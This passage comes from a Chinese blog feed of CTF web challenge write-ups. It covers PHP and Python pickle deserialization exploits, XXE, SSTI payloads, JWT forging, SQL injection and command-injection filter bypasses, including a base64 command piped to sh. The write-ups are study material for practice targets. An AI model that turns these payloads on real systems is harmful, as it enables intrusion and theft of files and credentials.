当对不可访问的私有属性使用unset时；自动调用</span><br><span class="line">9.__toString()当一个类的实例对象；被当成一个字符串输出时调用</span><br><span class="line">10.__invoke() 当脚本尝试将对象调用为函数时触发</span><br><span class="line">11.__wakeup()  使用unserialize(反序列化)时触发</span><br><span class="line">12.__sleep()  使用serialize(序列化)时触发</span><br></pre></td></tr></table></figure><p>序列化Pop链<br>利用几个类之间相互关联进行构造</p><p>反序列化构造pop链的题目要注意两个点：</p><ul><li><p>入口点，反序列化POP链构造的入口        </p></li><li><p>找危险函数，如果含有某些危险函数就可能导致漏洞达到目的</p></li></ul><p>这里反序化入口点在Show类，使用unserialize时触发<code>__wakeup()</code>，对$this-&gt;source正则匹配过滤关键字，如果$this-&gt;source此时是一个类的话，此时类就被当成了一个实例化对象，就会触发<code>__tostring</code>。</p><p>Test类中有魔术方法<code>__get</code>，<code>__toString()</code>访问了str的source属性，str是<code>Test</code>类，不存在source属性，就调用了Test类的<code>__get()</code>魔术方法。</p><p><code>__get()</code>方法将p作为函数使用，p实例化为<code>Modify</code>类，就调用了Modifier的<code>__invoke()</code>方法；<br><code>__invoke()</code>调用了<code>append()</code>方法，包含<code>$value</code>，若将<code>$value</code>为伪协议，则可读flag.php源码</p><p>综合：</p><p><em><strong>让Test类中的属性p等于Modifier这个类，从而触发__get()魔术方法，将Modifier这个类变成一个函数，从而调用__invoke()方法，进而调用include()函数，再让source 等于对象，进而触发__toString方法，输出内容</strong></em></p><p>构造exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();<span class="comment">//创建show对象,反序列化调用_wakeup方法</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> Show();<span class="comment">//让source等于对象，调用函数__toString方法</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();<span class="comment">//变函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="buu2/56.png"></p><p>成功返回一串base64编码。解码得到flag。</p><h3 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h3><p>前面也做过一个相关XXE注入，直接读flag，</p><p><img src="buu2/57.png"></p><p>没读到flag，把读取文件方式修改成php伪协议，</p><p>读取doLogin.php，得到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line">* autor: c0ny1</span><br><span class="line">* date: 2018-2-7</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">$USERNAME = &#x27;admin&#x27;; //账号</span><br><span class="line">$PASSWORD = &#x27;024b87931a03f738fff6693ce0a78c88&#x27;; //密码</span><br><span class="line">$result = null;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">$username = $creds-&gt;username;</span><br><span class="line">$password = $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">if($username == $USERNAME &amp;&amp; $password == $PASSWORD)&#123;</span><br><span class="line">$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username);</span><br><span class="line">&#125;</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">$result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看源码没啥用，</p><p>实现XXE攻击内网。</p><p>相关路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts</span><br><span class="line">/proc/net/arp</span><br></pre></td></tr></table></figure><p>发现存活主机：</p><p><img src="buu2/58.png"></p><p>使用第一个没有扫描到存活的主机，试了一下第二个，</p><p><img src="buu2/59.png"></p><p>返回ip地址，三个都访问爆破一下，结果第三个就存在flag。</p><p><img src="buu2/60.png"></p><p>如果本题在使用etc/hosts就找到主机，即可对最后一位数进行爆破。</p><p>补充一个读取历史命令的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///www-data/.bash_history</span><br></pre></td></tr></table></figure><h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>在解码处输入123，非base64编码的数，报错，存在ssti注入。</p><p><img src="buu2/61.png"></p><p>尝试先加密再解密ssti注入，得到结果，是存在ssti注入，这里传入的是4+4。</p><p>刚开始没有连着两个花括号一起加密，导致只返回花括号内的字符串。</p><p><img src="buu2/62.png"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>解密得到flag。</p><p>参考：</p><p><a href="https://www.cnblogs.com/h3zh1/p/12694933.html">https://www.cnblogs.com/h3zh1/p/12694933.html</a></p><h3 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h3><p>第一个页面有提示一定要买到v6，我们点击下一页进行查找，找了几页没发现，v6，但是page参数可控，我们可以进行爆破。</p><p>如果在页面修改参数时，会跳转到调试器暂停，导致我们操作不便。</p><p>写python脚本爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://640a0c0a-d512-4089-8d7d-648a51ca87d7.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2500</span>):</span><br><span class="line">r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆破出来第181页，这么长。而且很贵</p><p><img src="buu2/63.png"></p><p>抓包看看，有没有可控参数。</p><p>价格和折扣都可以控制，修改</p><p><img src="buu2/64.png"></p><p>怎么操作失败了，尝试了前面的都可以任意修改成功，</p><p>如果只修改折扣就成功了。</p><p><img src="buu2/65.png"></p><p>尝试伪造xff，不行，注意这里有一串代码</p><p><img src="buu2/66.png"></p><p>base64解密一下，</p><p><img src="buu2/67.png"></p><p>看到username是我自己的登陆名5，这里需要改为admin<br>后边解码不出来因为经过了sha256，需要破解key<br>找了一个工具破的<a href="https://github.com/brendan-rius/c-jwt-cracker">破解工具</a></p><p><img src="buu2/68.png"></p><p>然后生成伪造的<a href="https://link.csdn.net/?target=https://jwt.io/">JWT</a></p><p><img src="buu2/69.png"></p><p>成功绕过，记得在JWT后面加上;</p><p>f12查看页面代码，发现源码泄露<a href="http://www.zip/">www.zip</a></p><p><img src="buu2/70.png"></p><p>看了wp，存在python反序列化，pickle反序列化。</p><p>看到了在Admin.py中存在<code>pickle.loads()</code>这个函数，会造成反序列化命令执行：</p><p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055">大佬分析python魔术方法</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12178311.html">参考</a></p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())#将object对象序列化为字符串形式，而不存入文件中</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure><p>记得使用python2运行，不然会报错。</p><p>这样就可以打印flag.txt里的内容了，生成的payload传给become</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="buu2/71.png"></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;强网杯-2019-高明的黑客&quot;&gt;&lt;a href=&quot;#强网杯-2019-高明的黑客&quot; class=&quot;headerlink&quot; title=&quot;[强网杯 2019]高明的黑客&quot;&gt;&lt;/a&gt;[强网杯 2019]高明的黑客&lt;/h3&gt;&lt;p&gt;下载源码，解压一下，那么多php文件，怎么看的过来，感觉应该要用脚本处理了。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buu</title>
    <link href="http://example.com/2021/04/01/buu/"/>
    <id>http://example.com/2021/04/01/buu/</id>
    <published>2021-04-01T14:44:57.000Z</published>
    <updated>2021-07-27T01:43:50.201Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p><em><strong>然后各种尝试，发现了符号||有些不一样，但是没啥用，有可能是盲注，我们发现有数组，试一下堆叠注入。</strong></em></p><span id="more"></span><p><em><strong>输入<code>1;show tables</code>出现了Flag，感觉EasySQL应该比较简单，直接查看字段，返回nonono，以为是把Flag符号过滤，进行十六进制编码，还是不行。实在没得思路，看一下大佬的wp。</strong></em></p><p><code>select $_GET[&#39;query&#39;] || flag from Flag;</code></p><p><em><strong>大佬，居然可以猜出后台语句，哈哈哈。</strong></em></p><p><em><strong>符号||的意思是或，当1||后面的flag等于1，这时候sql语句就变成了</strong></em></p><p><code>select 1 from Flag;</code>返回1</p><p><strong><em>这里我们多加个符号</em>就可以查询表的全部数据</strong></p><p><code>select *，1 from Flag</code> <strong>这里多了一个1会新创建一个字段名为1每个数据都为1的数据</strong>。</p><p><img src="buu/1.png"></p><p>构造payload：<code>*,1</code>即可获得flag。</p><p><strong>本题特解关键：MySQL使用select查询时，如果有不存在的字段名，则会自动创建，不会报错，逻辑与运算，同时*可以查询所有数据，没被过滤。</strong></p><p>常规做法：</p><p>堆叠注入。</p><p>也是需要跟逻辑与相关，官方payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p><em><strong>关于 <code>sql_mode</code> : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 <code>PIPES_AS_CONCAT</code> 将 <code>||</code> 视为字符串的连接操作符而非 “或” 运算符。</strong></em></p><p><em><strong>还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 <code>||</code> 相当于是将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起</strong></em></p><p>其实相当于变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,flag from flag</span><br></pre></td></tr></table></figure><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p><strong>看见文件包含，还有?file=flag.php提示，直接伪协议读取文件。</strong></p><p>首先使用<code>php://input</code>协议，直接弹出hack，再试一下，<code>php://filter</code>协议，一看返回了一大串base64编码就知道成功了。</p><p><img src="buu/2.png"></p><p>解码得到flag.</p><p><img src="buu/3.png"></p><p><strong>本题关键：PHP伪协议</strong></p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p><em><strong>先查看源码，发现超链接，我们访问./Archive_room.php</strong></em></p><p><em><strong>点击secret，直接跳转了，查看网络，中间还有个网页，跳转速度很快，使用burp访问，得到secr3t.php</strong></em></p><p><img src="buu/4.png"></p><p>访问一下，得到源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>又是php伪协议读取文件，这里很明显过滤了../和tp和input和data，filter没被过滤，照样用上一篇文章的方法读取文件，得到flag。</p><p><strong>本题关键：PHP伪协议</strong></p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这是一道有关ping命令的题目。</p><p>先输入<code>127.0.0.1|ls</code>发现两个文件index.php,flag.php。</p><p><img src="buu/5.png"></p><p>直接使用cat命令抓flag，失败了，回显fxck your space!很明显空格符号被过滤了。</p><p>这里用前面bugku靶场web36关的方法绕过空格过滤，尝试了一下，发现{}也被过滤了，有一个没被过滤查看到了源码。</p><p><img src="buu/6.png"></p><p>发现flag字符给正则表达式过滤了，很难受，这里不会绕过，上网学习了。</p><p>网上的师傅使用的拼接符是***; 这个符号作用是：前面的执行完执行后面的***。</p><p>顺便复习一下：</p><p><em><strong>|(管道符)的作用是：上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）。</strong></em></p><p><em><strong>||作用：当前面的执行出错时（为假）执行后面的</strong></em></p><p><em><strong>command1&amp;&amp;command2 先执行1，执行成功后，执行2。</strong></em><br><em><strong>只有一个&amp;时，无论1有没有被执行，2都会执行。</strong></em></p><p><strong>补充一些命令绕过空格的方法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">IFS</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><em><strong>方法一：变换位置赋值绕过。</strong></em></p><p><em><strong>构造payload：</strong></em></p><p><code>127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php</code></p><p>或者：</p><p><code>127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p><p><em><strong>方法二：内联执行</strong></em> </p><p><em><strong>内联，就是将反引号内命令的输出作为输入执行。</strong></em></p><p><em><strong>构造payload：</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure><p><em><strong>方法三：通过执行sh命令来执行(题目中bush被过滤)</strong></em></p><p><em><strong>sh是linux中运行shell的命令，bash相当于sh的升级。</strong></em></p><p><em><strong>cat flag.php经base64加密，</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>看到标题tornade，百度了一下，Tornado是使用Python编写的Web服务器兼Web应用框架，就联想到了模板注入，再查看一下三个文件，welcome.txt文件有个render()函数，它是渲染函数，进行服务器端渲染，最后访问/hints.txt，发现md5加密，其中有个cookie_secret。首先要获得这个值：</p><p>观察了url由文件名和文件哈希值组成，随便修改一下哈希值，就跳转到新的url，这里就存在这ssti注入。(通过这里也可以知道我们要算出题目要求的哈希值，才可以获得flag。)</p><p><img src="buu/7.png"></p><p>查看了一下tornado官网，发现了RequestHandler.settings，尝试输入，没有结果，学习了一下大佬的，</p><p><strong>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</strong></p><p><img src="buu/8.png"></p><p>获得了cookie_secret值(不需要加密引号)，就可以相应的进行加密了，记得加密flag文件不要漏了/，先对/fllllllllllllag加密，记得都是32位小写的(其他位数不行？)以后直接用php的md5加密就好了。</p><p><img src="buu/9.png"></p><p><strong>本题关键：通过提示tornado来获取cookie_secret值()。</strong></p><h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>判断注入类型为单引号。</p><p>构造<code>admin&#39;--+</code></p><p><img src="buu/10.png"></p><p>猜字段数为3，4报错，这里的or和by要双写绕过。</p><p><img src="buu/11.png"></p><p>可以开始爆数据库了,同样都是双写union和select绕过，获得数据库名geek。</p><p><img src="buu/12.png"></p><p>爆数据表，全是双写绕过。</p><p><img src="buu/13.png"></p><p>爆出字段id，username，password，最后爆出flag。</p><p><code>-admin&#39; ununionion  seselectlect 1,2,group_concat(id,username,passwoorrd)frfromom b4bsql--+&amp;password=123</code></p><p><img src="buu/14.png"></p><p>这题很简单，就是没想到那么多双写。</p><p>本题关键：双写</p><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>这是一个计算器</p><p>找到了calc.php，访问得到源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>本题重点在于php字符串解析特性：可以看一下这篇文章：<a href="https://www.freebuf.com/news/213359.html">https://www.freebuf.com/news/213359.html</a></p><p>我们在num前面加个空格，可以绕过waf，因为php在解析时，会把空格去掉。</p><p>获得了php版本信息：</p><p><img src=""><img src="buu/15.png" alt="15"></p><p>在 phpinfo 中可以发现 system、exec 这一类命令执行的函数被禁用了。</p><p><img src="buu/16.png"></p><p>可以使用函数var_dump()，此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。还有函数scandir() ，此函数返回指定目录中的文件和目录的数组，配合查找文件，并查看。</p><p>由于/被过滤了，我们可以用chr(ascii)来绕过，</p><p><code>? num=1*1;var_dump(scandir(chr(47)))</code>来读取目录，</p><p>发现flagg。</p><p>最后通过函数file_get_contents读取文件内容，获得flag。</p><p><code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p><p><img src="buu/17.png"></p><p><strong>本题关键：PHP字符串解析特性，通过函数var_dump()和scandir()配合读文件，再通过chr(ascii)绕过代替../</strong></p><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>看了标题，http，打开burp查看一下。</p><p>发现了Secret.php文件</p><p><img src="buu/18.png"></p><p>访问后，要求来自<a href="https://www.sycsecret.com,然后要求浏览器改成syclover,改后,还要在本地查看flag.修改3个地方即可./">https://www.Sycsecret.com，然后要求浏览器改成Syclover，改后，还要在本地查看flag。修改3个地方即可。</a></p><p><img src="buu/19.png"></p><p><strong>本题关键：http类，通过burp查看其他网页，也可以f12，查看源码找到关键文件。</strong></p><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>使用dirsearch扫描目录，会被限制，一直跳400。</p><p>可以使用burp，构造相关文件字典进行爆破，查看到<a href="http://www.zip下载下来./">www.zip下载下来。</a></p><p>看见flag.php，打开一看就知道是假的了，这里主要分析class.php，应该是反序列化漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span 